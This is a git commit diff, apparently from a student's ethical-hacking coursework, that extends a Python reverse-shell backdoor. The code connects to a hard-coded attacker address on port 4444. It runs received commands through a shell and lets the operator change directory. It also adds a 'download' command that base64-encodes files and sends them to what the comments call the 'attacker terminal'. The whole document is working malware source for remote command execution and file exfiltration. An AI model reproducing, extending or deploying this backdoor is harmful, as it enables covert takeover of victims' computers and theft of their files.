0c2d232d8655610c32388006f30ec7ac837f259c
Drilon <drilon.krasniqi@edu.tbz.ch>
2020-07-04 17:39:54 +0200

    Added cd command + file download

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -2,25 +2,55 @@
 
 import socket
 import subprocess
-
+import json
+import os
+import base64
 
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket object
         self.connection.connect((ip, port))  # specify IP and Port of the destination for the connection
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)  # executes command. shell=True turns it into a string
         # returns result of executed command
 
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         while True:
-            command = self.connection.recv(1024)
-            command_result = self.execute_system_command(command)
+            command = self.reliable_receive()
+            if command[0] == "exit":
+                self.connection.close()
+                exit()
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_directory_to(command[1])
+            elif command[0] == "download":
+                command_result = self.read_file(command[1])
+            else:
+                command_result = self.execute_system_command(command)
             # Adds received data/command to function exe_sys_command which will run
-            self.connection.send(command_result)  # sends command results to attacker terminal
 
-        connection.close()
+            self.reliable_send(command_result)  # sends command results to attacker terminal
 
 
 my_backdoor = Backdoor("192.168.1.113", 4444)
